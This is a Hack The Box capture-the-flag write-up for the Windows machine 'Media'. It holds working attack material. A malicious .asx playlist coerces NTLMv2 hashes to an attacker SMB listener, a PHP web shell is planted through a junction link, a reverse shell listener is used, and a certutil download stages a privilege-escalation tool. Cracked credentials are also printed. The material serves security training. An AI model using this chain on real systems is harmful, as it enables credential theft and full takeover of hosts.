**Author:** Faridd

# HTB Write-Up: Media

| Field      | Details                                                          |
|------------|-------------------------------------------------------------------|
| Platform   | Hack The Box                                                     |
| Difficulty | Medium                                                           |
| OS         | Windows                                                          |
| Date       | October 30, 2026                                                 |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — "Join Our Team" Upload Form](#2-enumeration--join-our-team-upload-form)
3. [Initial Access — .asx File Upload to NTLMv2 Hash Capture](#3-initial-access--asx-file-upload-to-ntlmv2-hash-capture)
4. [Foothold — SSH Access via Cracked Credentials](#4-foothold--ssh-access-via-cracked-credentials)
5. [Privilege Escalation (Web) — Junction Link Abuse for PHP RCE](#5-privilege-escalation-web--junction-link-abuse-for-php-rce)
6. [Privilege Escalation (OS) — SeTcbPrivilege to NT AUTHORITY\SYSTEM](#6-privilege-escalation-os--setcbprivilege-to-nt-authoritysystem)

---

## 1. Reconnaissance

Port discovery was performed with **RustScan**:

```bash
rustscan -a 10.129.234.67 --ulimit=5000
```

**Open Ports:**

| Port | Service |
|------|---------|
| 22   | SSH     |
| 80   | HTTP    |
| 3389 | RDP     |

Port 22 open on a Windows target (alongside RDP on 3389) is notable on its own — Windows doesn't ship SSH by default, so this is a strong early signal that **OpenSSH for Windows** is installed and will matter later as an access path once credentials are obtained.

---

## 2. Enumeration — "Join Our Team" Upload Form

The web application hosted a "Join Our Team" page with a registration form: first name, last name, email, and an "introduction video" file upload field. Testing the upload showed **no file type restriction** — any extension could be uploaded. Since the backend was confirmed to be Windows, this pointed toward a Windows-specific media-processing attack rather than a typical PHP web shell upload.

---

## 3. Initial Access — .asx File Upload to NTLMv2 Hash Capture

### 3.1 — Why .asx

An `.asx` file is an XML-based Windows Media Player playlist format. The server runs a background process that automatically picks up newly uploaded files from the uploads directory and opens them with **Windows Media Player** (`wmplayer.exe`) to "process" them — this is what made the upload functionality dangerous despite accepting any file type.

An `.asx` playlist can contain a `<Ref>` entry pointing to a media file. Critically, that reference can be a **UNC path** (`\\IP\share\file`) instead of a local or HTTP path. When Windows Media Player parses a UNC reference, it treats it like any other network resource and transparently attempts to connect out to that path over **SMB (port 445)** — the same way Windows auto-authenticates to a mapped network drive or an `\\server\share` opened in Explorer.

### 3.2 — The Coercion Mechanism

This behavior is what turns a simple file upload into a credential-theft primitive, step by step:

1. **Automated trigger** — the server's background task notices the new upload and launches `wmplayer.exe` to open it, running as whatever service account that background task runs under (in this case, `enox`).
2. **Auto-connection (SMB coercion)** — Media Player reads the `<Ref href="\\ATTACKER_IP\share\test.wma" />` entry. Seeing a remote UNC path, Windows assumes it needs to fetch the file over the network and silently initiates an SMB connection to the attacker's IP, with no user interaction required.
3. **Hash leak** — to authenticate that SMB session, Windows automatically sends the **Net-NTLMv2** challenge/response hash of the account running the Media Player process. This is standard Windows SSO behavior: it doesn't ask "is this really a trusted server?" before attempting authentication — it just tries.
4. **Capture** — an attacker-controlled SMB listener (**Responder**) receives this authentication attempt and captures the NTLMv2 hash, which can then be cracked offline.

This is the same class of attack as forcing a `.lnk`, `.scf`, or `.url` file to coerce authentication — the `.asx`/`.wax` format is just another file type that Windows will process automatically and that supports a UNC reference.

### 3.3 — Building the Malicious Playlist

```bash
nano exploit.asx
```

```xml
<Asx Version="3.0">
  <Entry>
    <Ref href="\\10.10.14.25\share\test.wma" />
  </Entry>
</Asx>
```

### 3.4 — Capturing the Hash with Responder

Responder was started to listen for the inbound SMB authentication attempt:

```bash
sudo responder -I tun0 -dw
```

The `.asx` file was then uploaded through the web form. As soon as the backend's automated task opened it in Media Player, the coerced SMB connection landed on Responder:

```
[SMB] NTLMv2-SSP Client   : 10.129.234.67
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:dcb9b5f4e5fe8c57:BDF3815CC5AEDCE51CCC205A3E3E99FB:...
```

### 3.5 — Cracking the Hash

```bash
nano hash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

**Result:** `enox:1234virus@`

---

## 4. Foothold — SSH Access via Cracked Credentials

### 4.1 — Why SSH Instead of RDP

RDP authentication with the cracked credentials failed, so **SSH** was tried instead:

```bash
ssh enox@10.129.234.67
```

```
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

enox@MEDIA C:\Users\enox>
```

### 4.2 — How SSH Works on a Windows Host

This connects for the same underlying reason port 22 stood out during recon: Microsoft maintains an official port of **OpenSSH Server** (`sshd.exe`) as a native, installable Windows feature/service. Once installed and running, it behaves functionally the same as OpenSSH on Linux:

- `sshd.exe` runs as a background Windows service and listens on TCP/22 for incoming connections, independent of RDP or any other remote-access mechanism.
- When a client connects and submits a username/password, OpenSSH doesn't validate the password itself — it hands the credentials off to the **Windows Local Security Authority (LSA)**, the same subsystem that backs interactive logons.
- LSA checks the submitted password against the local **SAM database** (or AD, on a domain-joined box). If it matches, Windows authorizes the session and OpenSSH spawns a normal Windows shell (`cmd.exe` or PowerShell) for that user — which is why the session above lands in a standard `C:\Users\enox>` prompt rather than a Linux-style shell.

In short: SSH on Windows is a transport and authentication *front end* that still defers all identity decisions to native Windows authentication, so a valid local Windows account password is all that's needed, exactly as it was used here.

---

## 5. Privilege Escalation (Web) — Junction Link Abuse for PHP RCE

### 5.1 — Finding the Upload Logic

With a shell as `enox`, the web root was located. Since the stack was confirmed to be **XAMPP**, the web root defaults to `C:\xampp\htdocs\` out of the box — seeing `xampp` anywhere in a directory listing is enough on its own to know where `htdocs` will be, without needing to search for it.

```
type C:\xampp\htdocs\index.php
```

The relevant upload logic:

```php
$uploadDir = 'C:/Windows/Tasks/Uploads/';
$folderName = md5($firstname . $lastname . $email);
$targetDir = $uploadDir . $folderName . '/';
if (!file_exists($targetDir)) {
    mkdir($targetDir, 0777, true);
}
```

So every submission's uploaded file lands in `C:\Windows\Tasks\Uploads\<md5(firstname+lastname+email)>\` — a folder that is created fresh **only if it doesn't already exist**.

### 5.2 — The Junction Link Technique

A junction (`mklink /j`) is a Windows NTFS feature that makes one directory path transparently point to another directory elsewhere on the same volume — similar in spirit to a symlink, but implemented at the filesystem/reparse-point level and usable without admin rights for directory junctions (unlike true symlinks). Any read, write, or execute operation performed against the junction path is actually performed against the target directory it points to.

This matters here because of the `file_exists()` check in the upload code: the application only creates the per-submission folder **if it is missing**. If an attacker pre-creates that exact folder path as a junction pointing at the live web root (`C:\xampp\htdocs`), the application's own upload logic will skip folder creation (since the path "already exists") and will instead write the uploaded file **straight into the real web root** — turning an otherwise-isolated upload directory into a path traversal-free way to drop a file that Apache will directly execute as PHP.

The only requirement is predicting the exact MD5 folder name in advance, which is trivial since the hashing formula (`md5(firstname . lastname . email)`) is known from the leaked source.

### 5.3 — Creating the Junction

A set of registration values was chosen and hashed ahead of time:

```bash
echo -n "hackerhackerhacker@media.htb" | md5sum
# c35aacd28e6e9f20077f906497baa454
```

The junction was created *before* ever submitting that registration, so the upload folder would not pre-exist naturally:

```powershell
cmd /c mklink /j "C:\Windows\Tasks\Uploads\c35aacd28e6e9f20077f906497baa454" "C:\xampp\htdocs"
```

```
Junction created for C:\Windows\Tasks\Uploads\c35aacd28e6e9f20077f906497baa454 <<===>> C:\xampp\htdocs
```

### 5.4 — Uploading the Web Shell

A PHP web shell was prepared:

```php
<?php
system($_GET['cmd']);
?>
```

The registration form was then submitted using the exact firstname/lastname/email combination whose MD5 matched the junction, with `cmd.php` as the uploaded file. Because the target "upload" folder was really a junction to `htdocs`, the file landed directly in the live web root:

```powershell
dir C:\Windows\Tasks\Uploads\c35aacd28e6e9f20077f906497baa454
```

```
d-----  ...  assets
d-----  ...  css
d-----  ...  js
-a----  ...  cmd.php
-a----  ...  index.php
```

### 5.5 — Confirming RCE

```bash
curl http://10.129.234.67/cmd.php?cmd=whoami
# nt authority\local service
```

Command execution via HTTP was confirmed, running as the low-privileged **Local Service** account — not enough yet to read other users' files, so a reverse shell was caught for a more usable session:

```bash
rlwrap nc -nvlp 4445
```

```
PS C:\xampp\htdocs> whoami
nt authority\local service
```

### 5.6 — Checking Privileges

```powershell
whoami /priv
```

```
Privilege Name                State
============================= ========
SeTcbPrivilege                Disabled
SeChangeNotifyPrivilege       Enabled
SeCreateGlobalPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Disabled
SeTimeZonePrivilege           Disabled
```

**`SeTcbPrivilege`** stood out — "Act as part of the operating system" is one of the most dangerous Windows privileges, since it lets a process impersonate any user token, effectively functioning as **SYSTEM**. It was present but disabled by default, meaning a tool capable of enabling and leveraging it was needed.

---

## 6. Privilege Escalation (OS) — SeTcbPrivilege to NT AUTHORITY\SYSTEM

### 6.1 — Staging the Exploit

A public `SeTcbPrivilege` abuse tool was downloaded onto the target:

```bash
python3 -m http.server 9000
```

```powershell
certutil -urlcache -f "http://10.10.14.25:9000/seTcb.exe" "C:\temp\seTcb.exe"
```

### 6.2 — Creating a New User via SeTcb

The tool's `svc_add` mode was first used to abuse `SeTcbPrivilege` and create a new local user, `hacker`:

```powershell
.\seTcb.exe svc_add "cmd /c net user hacker pass123!@# /add"
```

```
net user

User accounts for \\
-------------------------------------------------------------------------------
Administrator            DefaultAccount           enox
Guest                    hacker                   WDAGUtilityAccount
```

### 6.3 — Elevating via SeTcb

The tool's `elevate` mode was then used to run a privileged command that added the newly created `hacker` user directly into the **Administrators** group:

```powershell
.\seTcb.exe elevate "cmd /c net localgroup Administrators hacker /add"
```

```
net localgroup administrators
Members
-------------------------------------------------------------------------------
Administrator
hacker
```

### 6.4 — Confirming Elevated Access

An SSH session as the new `hacker` account confirmed a full administrative privilege set (`SeDebugPrivilege`, `SeBackupPrivilege`, `SeTakeOwnershipPrivilege`, `SeImpersonatePrivilege`, and others all enabled):

```bash
ssh hacker@10.129.234.67
```

```powershell
whoami /priv
```

### 6.5 — Root Flag

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
# b2bc3db1a54ce3d36bd7de598cf0000f
```
